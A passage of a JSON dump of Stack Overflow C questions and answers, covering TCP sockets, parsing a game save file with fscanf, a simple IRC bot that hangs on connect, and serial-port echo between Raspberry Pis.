href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms740506.aspx\" rel=\"nofollow noreferrer\"><code>IPPROTO_TCP</code> can only be used with a real TCP (<code>SOCK_STREAM</code>) socket</a>:</p>\n\n<blockquote>\n  <p>IPPROTO_TCP<br>\n  6</p>\n  \n  <p>The Transmission Control Protocol (TCP). This is a possible value when the <code>af</code> parameter is <code>AF_INET</code> or <code>AF_INET6</code> <strong>and the <code>type</code> parameter is <code>SOCK_STREAM</code></strong>.</p>\n</blockquote>\n"}], "owner": {"reputation": 21, "user_id": 7311413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5914d10821e2f26263b5c5d4c69a2646?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur James", "link": "https://stackoverflow.com/users/7311413/arthur-james"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1894, "favorite_count": 0, "accepted_answer_id": 41369172, "answer_count": 2, "score": 1, "last_activity_date": 1483049120, "creation_date": 1482956082, "question_id": 41369086, "link": "https://stackoverflow.com/questions/41369086/connect-function-in-raw-socket", "title": "Connect function in raw socket?", "body": "<p>I am trying to initiate a TCP Three-Way-Handshake in C. However, it occurred to me that <code>connect</code> may already be establishing such a connection or in some way interfering. Does <code>connect</code> automatically establish a TCP connection whenever the socket it's called on has the <code>IPPROTO_TCP</code> option set?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482955169, "post_id": 41368809, "comment_id": 69939310, "body": "Any program that is using <code>fseek</code> to read what should be a simple sequence of data, and pays no attention to the return values fom file input functions, perhaps needs a rewrite."}, {"owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482955312, "post_id": 41368809, "comment_id": 69939383, "body": "Sure, can you help me."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1482955425, "post_id": 41368809, "comment_id": 69939438, "body": "I can&#39;t see you terminating with <code>&#39;\\0&#39;</code> any data items that appear to be reading a string. But really, please try to isolate the <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem. Show some examples of the expected input, and the actual input."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482955806, "post_id": 41368809, "comment_id": 69939595, "body": "Having trouble with input and <i>not</i> checking the return values of <code>fscanf()</code>, <code>fseek()</code> is like going to the doctor wearing <a href=\"https://en.wikipedia.org/wiki/Earmuffs\" rel=\"nofollow noreferrer\">earmuffs</a> and asking why one is sick.  Check the return values of the input functions."}, {"owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "edited": false, "score": 0, "creation_date": 1482955910, "post_id": 41368809, "comment_id": 69939639, "body": "I checked the values with pritf like these \t\t\t\t\t\t\tprintf(&quot;%c&quot;, game-&gt;words[b].name[c]=ch);"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482956031, "post_id": 41368809, "comment_id": 69939692, "body": "That is not checking the return value of the function.  Use something like <code>if (1 != fscanf(fptr,&quot;%d&quot;, &amp;game-&gt;words[b].row)) {puts(&quot;Failed&quot;); exit (-1);}</code> for each <code>fscanf()</code>.  For <code>fseek()</code>, only a return value of 0 is OK."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482956068, "post_id": 41368809, "comment_id": 69939719, "body": "Note that <code>fscanf</code> and <code>fseek</code> return a value <i>unrelated to the actual data</i>, as the <b>function value</b>. So if you expect to read one format field with <code>fscanf</code> that function should return <code>1</code>, when it successfully writes data to the pointer argument."}, {"owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "edited": false, "score": 0, "creation_date": 1482956072, "post_id": 41368809, "comment_id": 69939720, "body": "The values are correct, but I can only see them for the first line of the file, I can&#39;t find a way to do the second part of my code return the values of the next lines."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482956219, "post_id": 41368809, "comment_id": 69939780, "body": "And you still don&#39;t want to check the return value of the functions?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482956258, "post_id": 41368809, "comment_id": 69939798, "body": "In those <code>fseek(fptr,1,SEEK_CUR);</code> statements. Do you know that the <code>scanf</code> family typically ignores whitespace (except <code>%c</code>)? Time to read the man page? Or do some little test exercises to see how it all works?"}, {"owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "edited": false, "score": 0, "creation_date": 1482956293, "post_id": 41368809, "comment_id": 69939807, "body": "I checked and it returned Failed."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482956340, "post_id": 41368809, "comment_id": 69939826, "body": "It does not return <code>Failed</code>. <code>fscanf</code> returns the number of arguments that were converted. Or does &quot;it&quot; mean somemthing else?"}], "owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1482954727, "creation_date": 1482954727, "question_id": 41368809, "link": "https://stackoverflow.com/questions/41368809/c-how-to-create-a-cycle-of-fscanf-to-assing-elements-of-a-file-to-a-structure", "title": "C: How to create a cycle of fscanf to assing elements of a file to a structure", "body": "<p>I need to create a function that copies elements from a file to a structure.\nI am having trouble creating a cycle to assign the second line of code, and third... until an integer is assign here game->words[b].name[c]. Would it be better to use a function to read integers, characters, and to read a series of characters?</p>\n\n<pre><code>int loadgame(GAME *game){                                            \nFILE *fptr;\nint ch,a,b=0,c=0,i=0,j=0;\n\nfptr = (fopen(\"saveGame0.txt\", \"r\"));\n    printf(\"Error opening file\");\n    exit(1);\n}\nelse{\n    for(a=0;a&lt;2;a++){\n        while((ch = fgetc(fptr)) != ';'){\n       game-&gt;players[a].name[i]=ch;                                     \n        i++;    \n        }\n\n        fscanf(fptr, \"%d\", &amp;game-&gt;players[a].points);  \n\n        fseek(fptr,1,SEEK_CUR);                     \n        while ((ch = fgetc(fptr)) != '\\n'){                 \n            game-&gt;players[a].hand[j].letter = ch;\n            j++;\n        }\n    }\n    fscanf(fptr,\"%d\", &amp;game-&gt;word_count);\n    fseek(fptr,1,SEEK_CUR);\n</code></pre>\n\n<p>I AM HAVING TROUBLE IN THE PART BELOW.\nNext I need to find a way to repeat what is below, for every line of the file, until an integer is assing in the first while cicle to game->words[b].name[c] </p>\n\n<pre><code>            while((ch = fgetc(fptr)) != ';'){\n                game-&gt;words[b].name[c]=ch;\n                c++;                                    \n            }\n        fscanf(fptr,\"%c\", &amp;game-&gt;words[b].orientation);\n\n        fseek(fptr,1,SEEK_CUR);\n        fscanf(fptr,\"%d\", &amp;game-&gt;words[b].row);         \n        fseek(fptr,1,SEEK_CUR);\n\n        fscanf(fptr,\"%c\", &amp;game-&gt;words[b].col);         \n        fseek(fptr,1,SEEK_CUR);\n\n        fscanf(fptr,\"%d\", &amp;game-&gt;words[b].points);\n        fseek(fptr,1,SEEK_CUR);\n        fscanf(fptr,\"%d\",&amp;game-&gt;words[b].player);\n\n        fseek(fptr,1,SEEK_CUR);\n    }\n\n}\nfclose(fptr);\nreturn 0;\n</code></pre>\n\n<p>}</p>\n"}, {"tags": ["c", "network-programming", "bots", "irc"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1482953660, "post_id": 41368466, "comment_id": 69938689, "body": "wireshark and a debugger are tools you should get familiar with."}], "answers": [{"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 2, "last_activity_date": 1482954636, "last_edit_date": 1482954636, "creation_date": 1482954161, "answer_id": 41368679, "question_id": 41368466, "link": "https://stackoverflow.com/questions/41368466/irc-bot-malfunction/41368679#41368679", "title": "IRC bot malfunction", "body": "<p>Whatever other problems there might be, <code>delay()</code> is one. Your function in this test program, waits two seconds and then prints <code>1 2 3</code> all at the same time, because it only considers elapsed time from the program start, and not from the current moment.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n\nvoid delay(int milliseconds)\n{\n    long pause;\n    clock_t now;\n    pause = milliseconds*(CLOCKS_PER_SEC/1000);//set delay using\n    now = clock();\n    while( now &lt; pause )\n        now = clock();\n}\n\nint main (void)\n{  \n    delay(2000);\n    printf(\"1\\n\");\n\n    delay(2000);\n    printf(\"2\\n\");\n\n    delay(2000);\n    printf(\"3\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<p>This version prints <code>1 2 3</code> at two second intervals</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n\nvoid delay(clock_t milliseconds)\n{\n    clock_t elapsed, pause, stamp;\n    stamp = clock();\n    pause = milliseconds * CLOCKS_PER_SEC / 1000;\n    while ((elapsed = clock() - stamp) &lt; pause);\n}\n\nint main (void)\n{  \n    delay(2000);\n    printf(\"1\\n\");\n\n    delay(2000);\n    printf(\"2\\n\");\n\n    delay(2000);\n    printf(\"3\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<p>Please also notice, that in integer arithmetic, I do the multiplication before the division.</p>\n"}, {"tags": [], "owner": {"reputation": 460, "user_id": 3022125, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ahVNh.png?s=128&g=1", "display_name": "braindigitalis", "link": "https://stackoverflow.com/users/3022125/braindigitalis"}, "is_accepted": false, "score": 0, "last_activity_date": 1483542972, "creation_date": 1483542972, "answer_id": 41467176, "question_id": 41368466, "link": "https://stackoverflow.com/questions/41368466/irc-bot-malfunction/41467176#41467176", "title": "IRC bot malfunction", "body": "<p>Rethink your client and make it a state machine instead driven by an event engine such as epoll(), kqueue(), select() or poll().</p>\n\n<p>Generally, an IRC command generates a reply, but you don't know when they are going to arrive, and the protocol is designed such that you might want to send commands that aren't initiated by data coming from the server.</p>\n\n<p>Using a delay to authenticate to an IRC server is a no-no because there are various other commands that can be generated as part of authentication such as PING or CTCP's etc, your nick being in use, etc.</p>\n\n<p>Also, according to the RFC the NICK command must come first before user. Generally, IRC servers are forgiving, but don't take this for granted. As the adage goes, \"be generous in what you accept and strict in what you send\".</p>\n"}], "owner": {"reputation": 1, "user_id": 7351172, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe3d950e86aca43a14b21e9d0bac14a1?s=128&d=identicon&r=PG&f=1", "display_name": "shiny", "link": "https://stackoverflow.com/users/7351172/shiny"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1483542972, "creation_date": 1482953100, "question_id": 41368466, "link": "https://stackoverflow.com/questions/41368466/irc-bot-malfunction", "title": "IRC bot malfunction", "body": "<p>I have attempted to make a IRC bot in C. When the bot attempts to connect to an IRC server it enters an infinite loop where it receives nothing.\nI am not sure if this is because my process to join the IRC server is malformed or if I am missing some data that should be sent/received.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;sys/socket.h&gt;\n#include&lt;netdb.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;time.h&gt;\n\n\n#define MAXSIZE 4096\n\nvoid delay(int milliseconds)\n{\n    long pause;\n    clock_t now;\n\n    pause = milliseconds*(CLOCKS_PER_SEC/1000);//set delay using\n    now = clock();\n    while( now &lt; pause )\n        now = clock();\n}\n\nint send_data(int sockfd, char message[])\n{\n    send(sockfd, message, strlen(message), 0);\n    printf(\"OUT: %s\\n\", message);\n    return 1;\n}\n\nint recv_data(int sockfd, char *message)\n{\n    int n;\n    n = recv(sockfd, message, MAXSIZE, 0);\n    printf(\"IN: %s\\n\", message);\n    return n;\n}\n\nint tcp_connect(int *sockfd, char server[], char port[])\n{\n    //declare variables\n    struct addrinfo hints, *res;\n\n    //zero out structures\n    memset(&amp;hints,0,sizeof(hints));\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n\n    //query DNS server for IP address and port\n    getaddrinfo(server,port,&amp;hints,&amp;res);\n\n    //create socket for data transmission\n    *sockfd = socket(res-&gt;ai_family,res-&gt;ai_socktype,0);\n    if (*sockfd &lt; 0)\n    {\n        printf(\"failure to create socket\\n\");\n        return 0;\n    }\n\n    //connect to server side port using created socket\n    if (connect(*sockfd, res-&gt;ai_addr, res-&gt;ai_addrlen)!= 0)\n    {\n        printf(\"failure to connect to port\\n\");\n        return 0;\n    }\n\n    freeaddrinfo(res);\n    return 1;\n}\n\nint irc_auth(int sockfd)\n{\n    //create and start clock\n    clock_t start_t;\n    start_t = clock();\n\n    //seed RNG with clock output\n    srand(start_t);\n\n    //generate necessary variables\n    char name[15] = \"bot\";\n    char user[35] = \"USER \";\n    char nick[20] = \"NICK \";\n    char join[20] = \"JOIN #randChat\\r\\n\";\n    int i,id;\n\n    //generate random character for ID tag A-Z\n    for(i=0; i&lt;5; i++)\n    {\n        id = rand() % 91;\n        if(id &lt; 65)\n        {\n            while(id &lt; 65)\n            {\n                id = rand() % 91;\n            }\n        }\n        name[strlen(name)] = id;\n    }\n    //append return and null to string\n    strcat(nick,name);\n    strcat(nick,\"\\r\\n\");\n\n    //append to finish creating USER IRC command\n    strcat(user,name);\n    strcat(user,\" 8 * :\");\n    strcat(user,name);\n    strcat(user,\"\\r\\n\");\n\n    //send data to server\n    send_data(sockfd,user);\n    delay(1000);\n    send_data(sockfd,nick);\n    delay(1000);\n    send_data(sockfd,join);\n\n    return 1;\n}\nint main (int argc, char *argv)\n{\n//variables\n    int sockfd, n, flag;\n    char *mesg_in = malloc(sizeof(char) * MAXSIZE); \n    char *pos;\n    char nick[30];\n\n    char *mesg_out = malloc(sizeof(char) * MAXSIZE);\n\n    //connect to port 6667 of irc.freenode.org using tcp\n    while(flag&lt;1)\n    {\n        if(tcp_connect(&amp;sockfd,\"irc.freenode.org\",\"6667\") == 1)\n        {\n            flag = 1;\n        }\n    }   \n\n    //IRC channel authentication\n    irc_auth(sockfd);\n\n    //command loop\n    while(1)\n    {\n        mesg_in[0] = 0;// zero out message\n        //memset(mesg_in,0,strlen(mesg_in));\n        n = recv_data(sockfd,mesg_in);// pull message from channel\n\n        if (n &gt; 0)// check to see if it recieved a command\n        {\n            mesg_in[n] = 0;// set null at the end of recieved data\n\n            //respond to ping commands from server\n            if(strstr(mesg_in,\"PING\") != NULL)\n            {\n                mesg_out[0] = 0;// zero out message\n                pos = strstr(mesg_in,\" \")+1;// point to data needed\n                //append to out bound message\n                sprintf(mesg_out,\"PONG %s\\r\\n\",pos);\n                //send outbound message\n                send_data(sockfd,mesg_out);\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>any and all help would be greatly appreciated </p>\n"}, {"tags": ["c", "serial-port", "usb"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482952259, "post_id": 41368245, "comment_id": 69938110, "body": "Where have you put <code>#define DEVICE</code> to satisfy your compilation versions controlled by <code>#ifdef DEVICE</code>?"}, {"owner": {"reputation": 237, "user_id": 5243467, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb7ca64eda9911e73adba6964b025b7?s=128&d=identicon&r=PG&f=1", "display_name": "Leroy", "link": "https://stackoverflow.com/users/5243467/leroy"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482952324, "post_id": 41368245, "comment_id": 69938135, "body": "I compile with <code>-DDEVICE</code> to trigger it."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482952380, "post_id": 41368245, "comment_id": 69938162, "body": "Oh I see, as commented in the code. But I don&#39;t like it - can lead to finger trouble. I suggest a <i>specific value</i> must be defined so the compilation will fail without it."}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 3, "creation_date": 1482952497, "post_id": 41368245, "comment_id": 69938227, "body": "Try adding <code>tty.c_lflag &amp;= ~ECHO;</code>"}, {"owner": {"reputation": 237, "user_id": 5243467, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb7ca64eda9911e73adba6964b025b7?s=128&d=identicon&r=PG&f=1", "display_name": "Leroy", "link": "https://stackoverflow.com/users/5243467/leroy"}, "reply_to_user": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1482953065, "post_id": 41368245, "comment_id": 69938436, "body": "@MarkPlotnick that didn&#39;t do the trick. Still reading data written."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482953160, "post_id": 41368245, "comment_id": 69938475, "body": "It could be that you physical connection is shorting RX to TX. Try disconnection it and re-run."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1483117974, "post_id": 41368245, "comment_id": 70001920, "body": "the function: <code>strerror()</code> requires the header file: <code>string.h</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1483118244, "post_id": 41368245, "comment_id": 70002046, "body": "when writing the <code>main()</code> function signature and the parameters are not going to be used, use the signature: <code>int main( void )</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1483118381, "post_id": 41368245, "comment_id": 70002117, "body": "the third parameter of the function: <code>write()</code> is expected to be a <code>size_t</code> not an <code>int</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1483119440, "post_id": 41368245, "comment_id": 70002584, "body": "this line: <code>if (nread &gt; 0 &amp;&amp; nread &lt;= len) {</code> is not a good idea.  Suggest: <code>if (nread &gt; 0) {</code>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1483119518, "post_id": 41368245, "comment_id": 70002619, "body": "the problem seems to be in the function: <code>set_interface_attribs()</code>  I suspect the interface is initialized to &#39;echo on&#39;  and the initialization code in the function does not turn that echo mode OFF.   A test of extending the length of the `read() might make that obvious."}], "answers": [{"tags": [], "owner": {"reputation": 13673, "user_id": 1599004, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df9d2a02744f666e97375e05fdc54255?s=128&d=identicon&r=PG", "display_name": "sawdust", "link": "https://stackoverflow.com/users/1599004/sawdust"}, "is_accepted": false, "score": 4, "last_activity_date": 1482994381, "last_edit_date": 1495541338, "creation_date": 1482960268, "answer_id": 41369916, "question_id": 41368245, "link": "https://stackoverflow.com/questions/41368245/reading-from-serial-port-always-returns-what-was-written/41369916#41369916", "title": "reading from serial port always returns what was written", "body": "<p>Beside not disabling the ECHO attributes (as @MarkPlotnick commented), you have two misapplied assignments: </p>\n\n<pre><code>tty.c_iflag |= ICANON;\n</code></pre>\n\n<p>ICANON belongs to the lflag member, and </p>\n\n<pre><code>tty.c_iflag &amp;= ~OPOST;\n</code></pre>\n\n<p>OPOST belongs to the oflag member.<br>\nConsidering these errors, did you properly apply @MarkPlotnick's suggestion?</p>\n\n<p>See <a href=\"https://stackoverflow.com/questions/41224496/working-with-linux-serial-port-in-c-not-able-to-get-full-data/41252962#41252962\">Working with linux serial port in C, Not able to get full data</a> for a working canonical setup.</p>\n\n<pre><code>cfsetospeed(&amp;tty, (speed_t)speed);\ncfsetispeed(&amp;tty, (speed_t)speed);\n\ntty.c_cflag |= CLOCAL | CREAD;\ntty.c_cflag &amp;= ~CSIZE;\ntty.c_cflag |= CS8;         /* 8-bit characters */\ntty.c_cflag &amp;= ~PARENB;     /* no parity bit */\ntty.c_cflag &amp;= ~CSTOPB;     /* only need 1 stop bit */\ntty.c_cflag &amp;= ~CRTSCTS;    /* no hardware flowcontrol */\n\ntty.c_lflag |= ICANON | ISIG;  /* canonical input */\ntty.c_lflag &amp;= ~(ECHO | ECHOE | ECHONL | IEXTEN);\n\ntty.c_iflag &amp;= ~INPCK;\ntty.c_iflag |= IGNCR;\ntty.c_iflag &amp;= ~(INLCR | ICRNL | IUCLC | IMAXBEL);\ntty.c_iflag &amp;= ~(IXON | IXOFF | IXANY);   /* no SW flowcontrol */\n\ntty.c_oflag &amp;= ~OPOST;\n</code></pre>\n\n<hr>\n\n<p>Note that it is also possible to have echo enabled on the far end.<br>\nTo determine if the echo is generated locally or from the far end, simply disconnect the remote device (assuming you're using UARTs and/or USB-to-serial adapters), and transmit.<br>\nIf you still get echo, then it's generated locally, which is controlled by the <em>termios</em> ECHO attributes.<br>\nIf you no longer get an echo, then it's the remote unit that is repeating its input back to the sender.</p>\n\n<hr>\n\n<p>BTW Your program as posted does not compile cleanly.<br>\nIt's missing <code>#include &lt;string.h&gt;</code><br>\nThe <em>termios</em> initialization routine that you copied (but then incorrectly modified) has proper checking of return values, but your read and write routines do not check for errors.</p>\n"}, {"tags": [], "owner": {"reputation": 237, "user_id": 5243467, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb7ca64eda9911e73adba6964b025b7?s=128&d=identicon&r=PG&f=1", "display_name": "Leroy", "link": "https://stackoverflow.com/users/5243467/leroy"}, "is_accepted": true, "score": 0, "last_activity_date": 1483031323, "creation_date": 1483031323, "answer_id": 41384192, "question_id": 41368245, "link": "https://stackoverflow.com/questions/41368245/reading-from-serial-port-always-returns-what-was-written/41384192#41384192", "title": "reading from serial port always returns what was written", "body": "<p>I learned a lot from everyone's answers and am grateful for them because I will need them as I move on with this project. For <em>this</em> particular case, however, the issue ended up being permissions. Yep, file permissions on <code>ttyGSO</code>.</p>\n\n<p>I completely expected a <code>permission denied</code> error from <code>open</code> and never got one, so I never considered the possibility. Especially since I opened the files in <code>RDWR</code> mode, I could write to the serial file, and it <em>appeared</em> I was reading data (although the same data) it never dawned on me that perhaps I didn't have read permissions.</p>\n"}], "owner": {"reputation": 237, "user_id": 5243467, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb7ca64eda9911e73adba6964b025b7?s=128&d=identicon&r=PG&f=1", "display_name": "Leroy", "link": "https://stackoverflow.com/users/5243467/leroy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 662, "favorite_count": 0, "accepted_answer_id": 41384192, "answer_count": 2, "score": 1, "last_activity_date": 1483031323, "creation_date": 1482951996, "question_id": 41368245, "link": "https://stackoverflow.com/questions/41368245/reading-from-serial-port-always-returns-what-was-written", "title": "reading from serial port always returns what was written", "body": "<p>I'm using a Raspberry Pi Zero in device mode and a Raspberry Pi B in host mode. I'm connecting the two with a USB cable. My goal right now is just to send simple, arbitrary data back and forth between the two Pi's.</p>\n\n<p>The problem is whichever Pi writes to the serial port first ends up reading what it wrote. The program I've written has the device send <code>d\\n</code> and the host send <code>h\\n</code>. So, if the device writes first, the the host reads correctly the <code>d\\n</code>, then writes <code>h\\n</code> to the serial port. But the device ends up reading <code>d\\n</code>! The problem persists if I switch it so that the host writes first.</p>\n\n<p>I've tried adding various <code>tcflush</code> calls to the program after writing but before reading, but it doesn't work. I've also tried sleeping for various amounts of time. I've read waiting 100 microseconds for each character written and I've slept for several seconds.</p>\n\n<p>My setup requires me to not have a constant connection between both Pi's at the same time because of the Pi Zero's single data-capable usb port. So, to test, I'm actually plugging in a keyboard and running the program, then plugging in the proper cable to transfer data. I can transfer data, but not after writing because the program simply reads back what it wrote.</p>\n\n<p>I'm starting to think I've fallen into a noob trap that I can't fathom. Here is the code I'm using:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;    \n#include &lt;termios.h&gt;\n#include &lt;errno.h&gt;\n\n/*\n * gcc -o device_rw -DDEVICE serial_rw.c\n * gcc -o host_rw serial_rw.c\n */\n\n#define SERIAL_DEVICE \"/dev/ttyGS0\"\n#define SERIAL_HOST   \"/dev/ttyACM0\"\n\n#ifdef DEVICE\n#define _TTY SERIAL_DEVICE\n#else\n#define _TTY SERIAL_HOST\n#endif\n\nint\nset_interface_attribs(int fd, int speed)\n{\n    struct termios tty;\n\n    if (tcgetattr(fd, &amp;tty) &lt; 0) {\n        printf(\"Error from tcgetattr: %s\\n\", strerror(errno));\n        return -1;\n    }\n\n    cfsetospeed(&amp;tty, (speed_t)speed);\n    cfsetispeed(&amp;tty, (speed_t)speed);\n\n    tty.c_cflag &amp;= ~PARENB;     /* no parity bit */\n    tty.c_cflag &amp;= ~CSTOPB;     /* only need 1 stop bit */\n    tty.c_cflag &amp;= ~CSIZE;\n    tty.c_cflag |= CS8;         /* 8-bit characters */\n\n    tty.c_cflag &amp;= ~CRTSCTS;    /* no hardware flowcontrol */\n    tty.c_cflag |= (CLOCAL | CREAD);    /* ignore modem controls */\n\n    tty.c_iflag |= IGNPAR | IGNCR;\n    tty.c_iflag &amp;= ~(IXON | IXOFF | IXANY);\n    tty.c_iflag |= ICANON;\n    